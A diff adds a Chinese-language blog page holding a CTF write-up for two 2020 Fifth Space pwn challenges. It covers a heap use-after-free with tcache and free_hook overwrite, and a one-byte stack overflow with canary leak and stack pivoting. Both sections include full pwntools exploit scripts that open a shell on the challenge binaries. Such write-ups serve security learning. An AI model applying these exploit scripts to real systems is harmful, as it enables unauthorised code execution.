@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>5space (of-twice复现) | Bin Fantasy🤯</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="​        6月份的第五空间，依然啥也没做出来，不仅如此，复现还复现了好几天，算是大致上弄明白思路了。记录一下以后复习用。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="5space (of-twice复现)">
+<meta property="og:url" content="http://example.com/2020/07/13/2020%205space/index.html">
+<meta property="og:site_name" content="Bin Fantasy🤯">
+<meta property="og:description" content="​        6月份的第五空间，依然啥也没做出来，不仅如此，复现还复现了好几天，算是大致上弄明白思路了。记录一下以后复习用。">
+<meta property="og:locale">
+<meta property="og:image" content="https://s1.ax1x.com/2020/07/13/UYhe8H.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/07/13/UYhKKI.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/07/13/UYhm2d.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/07/13/UYIDdP.png">
+<meta property="article:published_time" content="2020-07-13T12:14:08.000Z">
+<meta property="article:modified_time" content="2020-07-13T13:05:24.509Z">
+<meta property="article:author" content="Ash3n On3">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s1.ax1x.com/2020/07/13/UYhe8H.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Bin Fantasy🤯" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/plugin/bganimation/bg.css">
+
+  
+
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" rel="stylesheet" type="text/css">
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <div class="outer">
+        <div class="widget-wrap mobile-header">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/avatar/avatar%20(3).jpg">
+    <h2 class="author">Ash3n On3</h2>
+    <h3 class="description"></h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>14</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>0</strong><br>标签</div></a>
+    </div>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+        <section id="main"><article id="post-2020 5space" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/07/13/2020%205space/" class="article-date">
+  <time class="post-time" datetime="2020-07-13T12:14:08.000Z" itemprop="datePublished">
+    <span class="post-month">7月</span><br/>
+    <span class="post-day">13</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      5space (of-twice复现)
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>​        6月份的第五空间，依然啥也没做出来，不仅如此，复现还复现了好几天，算是大致上弄明白思路了。记录一下以后复习用。<span id="more"></span></p>
+<h2 id="0x00-of"><a href="#0x00-of" class="headerlink" title="0x00 . of"></a>0x00 . of</h2><p>​        题目直接给的就是一个.c的源码，看源码remote解题。源码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NUM 0x10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* chunks[NUM];</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> cookie;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE 0x100</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_io</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    read(fd, &amp;cookie, <span class="number">8</span>);</span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">get_int</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> res;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%ld&quot;</span>, &amp;res);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">allocate</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> idx;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">    idx = get_int(); </span><br><span class="line">    <span class="keyword">if</span>(idx &gt;= NUM)&#123;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">char</span>* buf = <span class="built_in">malloc</span>(SIZE);</span><br><span class="line">    <span class="keyword">if</span>(buf == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;allocate failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    chunks[idx] = buf;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>* p = chunks[idx] + SIZE - <span class="number">8</span>;</span><br><span class="line">    *p = cookie;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> idx;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">    idx = get_int(); </span><br><span class="line">    <span class="keyword">if</span>(idx &gt;= NUM || chunks[idx] == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>* p = chunks[idx] + SIZE - <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">if</span>(*p != cookie) <span class="keyword">return</span>;</span><br><span class="line">    *p = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">free</span>(chunks[idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> idx;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">    idx = get_int(); </span><br><span class="line">    <span class="keyword">if</span>(idx &gt;= NUM || chunks[idx] == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>* p = chunks[idx] + SIZE - <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">if</span>(*p != cookie) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;Content: &quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;Content: &quot;</span>));</span><br><span class="line">    write(<span class="number">1</span>, chunks[idx], SIZE - <span class="number">8</span>);</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;\n&quot;</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> idx;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">    idx = get_int(); </span><br><span class="line">    <span class="keyword">if</span>(idx &gt;= NUM || chunks[idx] == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>* p = chunks[idx] + SIZE - <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">if</span>(*p != cookie) <span class="keyword">return</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, chunks[idx], SIZE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">menu</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1. allocate&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2. edit&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3. show&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4. delete&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;5. exit&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your choice: &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    init_io();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Made on Ubuntu 18.04&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        menu();</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> choice = get_int();</span><br><span class="line">        <span class="keyword">switch</span>(choice)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                allocate();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                edit();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                show();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                <span class="keyword">delete</span>();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Unknown&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​        看上去是个heap题，而且没有double free，但是有UAF。不过这个题目在每一个chunk中塞进了一个cookies，cookies随机生成，所以说如果要泄露起来就会很麻烦。不过看了不少write up，都说这题在部署上有点问题，remote过去不存在cookies的。所以可以正常思路直接写。</p>
+<p>​        用UAF可以泄露出libc基质，改写free_hook或者malloc_hook，使其指向system，再free掉写着”/bin/sh”的堆，就相当于执行了system(“/bin/sh”)。</p>
+<p>​        不过这题碰到了一个新的机制tcache。tcache是在libc2.23之后引入的，跟glibc中的各种bin类似，是一个对chunk进行申请释放操作时会用到的一个内存池。tcache是64个单向链表，每个链表最多7个节点(chunk)，chunk的大小在32bit上是12到512（8byte递增）；在64bits上是24到1024（16bytes递增）。</p>
+<p>​        在这题中，申请chunk的大小统一为0x100，属于unsort bin，所以我们如果释放8个chunk，才会使第8个chunk处于unsort bin中。而此时unsort bin中仅有一个chunk，其fd和bk都指向main_arena的一定偏移处。即可leak出libc。</p>
+<p>​        <a href="%5Bhttp://ggb0n.cool/2020/06/26/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4pwn%E9%A2%98%E7%BB%83%E4%B9%A0/%5D(http://ggb0n.cool/2020/06/26/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4pwn%E9%A2%98%E7%BB%83%E4%B9%A0/)">payload参考</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index</span>):</span></span><br><span class="line">   p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,note</span>):</span></span><br><span class="line">   p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">   p.sendafter(<span class="string">&quot;Content: &quot;</span>,note)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">   p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">   p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="comment">#p=remote(&quot;121.36.74.70&quot;,9999)</span></span><br><span class="line">p=process(<span class="string">&quot;./of&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">   add(i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">   delete(i)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">libc=u64(p.recv(<span class="number">6</span>)+<span class="string">&quot;\x00\x00&quot;</span>)-<span class="number">0x7ffff7dcfca0</span>+<span class="number">0x7ffff79e4000</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc)</span><br><span class="line">edit(<span class="number">6</span>,p64(libc+<span class="number">0x003ed8e8</span>))</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">add(<span class="number">10</span>)</span><br><span class="line">add(<span class="number">11</span>)</span><br><span class="line">edit(<span class="number">11</span>,p64(libc+<span class="number">0x04f440</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x01-twice"><a href="#0x01-twice" class="headerlink" title="0x01 . twice"></a>0x01 . twice</h2><p>​        本质上是个rop题。。。但是确实非常费脑子，看得头秃，有的调试还没整明白，之后再详细研究漏洞原理。</p>
+<p>​        主函数如下，主要功能是遍历调用judge1，实际上只能成功调用两次。</p>
+<img src="https://s1.ax1x.com/2020/07/13/UYhe8H.png" style="zoom:80%;" />
+
+<p>​        judge1是程序的主要函数，实现了读入的功能，读入的字节数由judge2决定。而且如果ncount不为0或1，则返回值为0，这也就限定了主函数中的for循环仅进行两次。</p>
+<img src="https://s1.ax1x.com/2020/07/13/UYhKKI.png" alt="image-20200713200847301" style="zoom:80%;" />
+
+<p>​            judge2中限定了，ncount为0时返回值为89，ncount为1时返回值为112，其他情况下不允许读入。</p>
+<p><img src="https://s1.ax1x.com/2020/07/13/UYhm2d.png" alt="image-20200713201139059"></p>
+<p>​        程序的主要功能是允许进行两次读入，第一次读入89字节，第二次112字节，但是buf的长度是88，因此会溢出一个字节。</p>
+<p><img src="https://s1.ax1x.com/2020/07/13/UYIDdP.png" alt="image-20200713205401610"></p>
+<p>​        利用这个溢出，再加上read读入数据不加以补“\x00”的特性，在read的下一步进行puts时，程序会输出到下一个”\x00”为止，因此我们可以泄露出旧的rbp地址以及canary的值。</p>
+<p>​        不过程序开启了NX保护，栈上代码不可执行，不能直接写shellcode。这里需要用到新知识，栈转移技术（<a target="_blank" rel="noopener" href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/fancy-rop-zh/#_5">frame faking</a>），制作一个假的栈帧进行rop。因为程序中没有system函数，因此我们需要用rop泄露出libc基址，再进行rop调用system(“/bin/sh”)</p>
+<p>​        frame faking的大致payload格式为：</p>
+<p>​        |xxxx xxxx|rop chain|padding|fake ebp|leave addr|</p>
+<p>​        将返回地址覆盖为leave汇编代码的地址，这样read函数结束后先进行本身函数的leave操作，再跳转到指定地址（即leave地址）又进行一次leave操作，使得rsp和rbp指向rop chain的适当位置，得以执行我们设计的fake stack frame。</p>
+<p>​        将rop chain细化可以得到如下payload：</p>
+<p>​        |xxxx xxxx|arg1|arg2|…|fuction addr|ret addr|padding|fake ebp|leave addr|</p>
+<p>​        为了多次进行leak，需要把上述ret addr即假栈帧的返回地址，再设置为漏洞所在函数，即可重复调用。</p>
+<p>​        此处需要注意的是，rop chain中可能需要进行弹栈操作，需要利用ROPgardge查找相应的地址。</p>
+<p>​        <a target="_blank" rel="noopener" href="https://blog.csdn.net/baidu_36110484/article/details/107037767">payload参考</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">  </span><br><span class="line">p = process(<span class="string">&#x27;./twice&#x27;</span>)</span><br><span class="line">puts_plt_addr = <span class="number">0x4005C0</span></span><br><span class="line">read_got_addr = <span class="number">0x601038</span></span><br><span class="line">pop_rdi = <span class="number">0x400923</span></span><br><span class="line">leave = <span class="number">0x400879</span></span><br><span class="line">main_addr = <span class="number">0x40087B</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">88</span>+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv(<span class="number">89</span>)</span><br><span class="line">canary = u64(<span class="string">&#x27;\x00&#x27;</span>+p.recv(<span class="number">7</span>))</span><br><span class="line">success(<span class="built_in">hex</span>(canary))</span><br><span class="line">rbp = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">112</span></span><br><span class="line">success(<span class="built_in">hex</span>(rbp))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(pop_rdi)+p64(read_got_addr)+p64(puts_plt_addr)+p64(main_addr)</span><br><span class="line">payload += <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>*<span class="number">6</span>+p64(canary)+p64(rbp)+p64(leave)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">libc_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-0xEE590s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">88</span>+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv(<span class="number">89</span>)</span><br><span class="line">canary = u64(<span class="string">&#x27;\x00&#x27;</span>+p.recv(<span class="number">7</span>))</span><br><span class="line">success(<span class="built_in">hex</span>(canary))</span><br><span class="line">rbp2 = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">112</span></span><br><span class="line">success(<span class="built_in">hex</span>(rbp2))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(pop_rdi)+p64(libc_addr+<span class="number">0x1881AC</span>)+p64(libc_addr+<span class="number">0x48880</span>)+p64(main_addr)</span><br><span class="line">payload += <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>*<span class="number">6</span>+p64(canary)+p64(rbp2)+p64(leave)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/07/13/2020%205space/" data-id="ckmlis0yy0003s0lj0fhc995e" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/07/25/pwnable/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Pwnable.tw (start &amp; calc)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/07/07/sandbox/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Seccomp Sandbox (ORW)</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <h1 class="blog-title">Bin Fantasy🤯</h1>
+    <h2 class="blog-subtitle">You may found nothing here.</h2>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/avatar/avatar%20(3).jpg">
+    <h2 class="author">Ash3n On3</h2>
+    <h3 class="description"></h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>14</strong><br>文章</div></a>
